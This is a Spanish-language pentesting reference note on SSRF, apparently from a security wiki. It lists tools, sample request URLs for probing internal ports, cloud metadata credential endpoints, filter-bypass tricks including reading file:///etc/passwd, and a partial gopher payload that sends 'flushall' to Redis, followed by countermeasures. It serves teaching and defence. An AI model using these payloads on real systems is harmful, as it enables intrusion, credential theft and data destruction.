---
title: Análisis de SSRF (Server-Side Request Forgery)
slug: analisis-ssrf
aliases: [Análisis de SSRF (Server-Side Request Forgery)]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Avanzada
mitre: [T1190]
related: []
learning_refs: []
---

# Análisis de SSRF (Server-Side Request Forgery)

## Descripción
La vulnerabilidad SSRF (Server-Side Request Forgery) permite a un atacante inducir a una aplicación web a realizar peticiones HTTP (o de otros protocolos) hacia una infraestructura interna o externa arbitraria. Según *Web Hacking 101*, el SSRF es crítico porque permite al atacante utilizar el servidor vulnerable como un "pivote" para acceder a sistemas protegidos por firewalls que no son accesibles desde internet.

## Herramientas
- **Burp Suite (Collaborator)** — Indispensable para detectar Blind SSRF (interacciones fuera de banda).
- **Gopherus** — Herramienta para generar payloads del protocolo `gopher://` (permite atacar Redis, MySQL, etc.).
- **DNS Rebinding Tools** — Para saltar protecciones de listas negras basadas en IPs.
- **ssrf-sheriff** — Escáner automatizado para identificar parámetros vulnerables a SSRF.

## Comandos / Ejemplos

### 1. Enumeración de Servicios Internos
Uso de un parámetro vulnerable para escanear la red interna:
```bash
# Probar puertos comunes en localhost
http://target.com/api/fetch?url=http://127.0.0.1:22
http://target.com/api/fetch?url=http://127.0.0.1:80
http://target.com/api/fetch?url=http://127.0.0.1:6379 (Redis)
```

### 2. Exfiltración de Metadatos de Cloud
Si la aplicación corre en la nube, se pueden extraer credenciales temporales y metadatos de la instancia:
- **AWS (v1)**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
- **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/instance/attributes/` (Requiere cabecera `Metadata-Flavor: Google`)
- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`

### 3. Bypass de Filtros (Bypasses)
- **Codificaciones de IP**: `127.0.0.1` → `2130706433` (Decimal) o `017700000001` (Octal).
- **Redirecciones HTTP**: Si el servidor permite redirecciones, apunta el parámetro a un servidor propio que redirija a `http://127.0.0.1`.
- **DNS alternativos**: Usar servicios como `localtest.me` (que resuelve a `127.0.0.1`).
- **Uso de Schemas raros**: `file:///etc/passwd`, `dict://127.0.0.1:11211/`, `gopher://127.0.0.1:6379/`.

### 4. Ataque a Servicios Internos (Redis via Gopher)
```bash
# Ejemplo de payload gopher para escribir un archivo en Redis
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

## Contramedidas
- **Lista Blanca de Dominios/IPs**: Solo permitir peticiones a destinos confiables conocidos.
- **Validación de Egresos (Egress Filtering)**: Bloquear el tráfico saliente desde el servidor web hacia la red interna (excepto lo estrictamente necesario).
- **Desactivar Schemas no usados**: Limitar la función a solo `http://` y `https://`.
- **Actualizar metadatos (v2)**: En AWS, forzar el uso de IMDSv2 para requerir tokens de sesión.

## Referencias
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
- Cheng, P. (2016). *Web Hacking 101*. Leanpub.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
